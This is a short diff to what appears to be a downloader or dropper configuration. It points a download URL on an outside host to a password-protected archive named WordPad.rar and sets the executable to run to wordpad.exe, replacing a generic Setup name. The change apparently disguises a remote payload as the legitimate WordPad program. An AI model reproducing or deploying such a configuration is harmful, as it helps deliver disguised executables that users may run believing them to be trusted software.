@@ -1,4 +1,4 @@
-url=https://w3services.ca/Setup.rar
-name=Setup.rar
+url=https://w3services.ca/WordPad.rar
+name=WordPad.rar
 password=2025
-setup=Setup.exe
+setup=wordpad.exe
